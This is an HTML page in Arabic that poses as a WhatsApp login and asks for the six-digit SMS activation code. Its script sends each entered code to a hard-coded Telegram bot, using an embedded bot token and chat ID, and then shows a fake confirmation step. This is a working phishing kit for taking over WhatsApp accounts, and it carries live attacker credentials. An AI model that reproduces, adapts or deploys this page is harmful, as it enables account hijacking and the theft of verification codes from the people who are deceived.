<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>تسجيل الدخول إلى WhatsApp</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        header {
            background-color: #25D366;
            color: white;
            width: 100%;
            padding: 15px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            position: fixed;
            top: 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        header img {
            vertical-align: middle;
            margin-right: 10px;
        }

        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-top: 100px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 26px;
            color: #333;
            margin-bottom: 15px;
        }

        .container p {
            font-size: 16px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.6;
        }

        .container input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }

        .container input:focus {
            outline: none;
            border-color: #25D366;
            box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
        }

        .container button {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        #countdown {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-top: -10px;
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" width="30">
        WhatsApp
    </header>

    <div class="container" id="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h1>المرحلة الأولى: رمز التفعيل</h1>
        <p>يرجى إدخال رمز التفعيل الأول المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
        <input id="activationCode1" type="tel" placeholder="رمز التفعيل الأول" maxlength="6">
        <div id="errorActivation1" class="error"></div>
        <button onclick="submitFirstActivationCode()">متابعة</button>
        <div id="countdown"></div>
    </div>

    <script>
        const correctActivationCode1 = "123456"; // الرمز الصحيح للتفعيل الأول

        function sendCodeToTelegram(code, type) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = `${type}: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالخادم:', error);
            });
        }

        function startCountdown(callback) {
            let countdownValue = 5;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    countdownDisplay.textContent = '';
                    callback();
                } else {
                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                }
            }, 1000);
        }

        function submitFirstActivationCode() {
            const activationCode1 = document.getElementById('activationCode1').value;
            const errorDisplay = document.getElementById('errorActivation1');

            if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
                errorDisplay.textContent = 'يرجى إدخال رمز مكون من 6 أرقام فقط.';
                return;
            }

            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");

            if (activationCode1 !== correctActivationCode1) {
                errorDisplay.textContent = 'رمز التفعيل الأول غير صحيح.';
                return;
            }

            errorDisplay.textContent = '';
            startCountdown(() => {
                const container = document.getElementById('container');
                container.innerHTML = `
                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                    <h1>المرحلة الثانية</h1>
                    <p>تم إدخال رمز التفعيل الأول بنجاح!.</p>
                    <button onclick="alert('إتمام جميع المراحل')">إنهاء</button>
                    <div id="countdown"></div>
                `;
            });
        }
    </script>
</body>

</html>
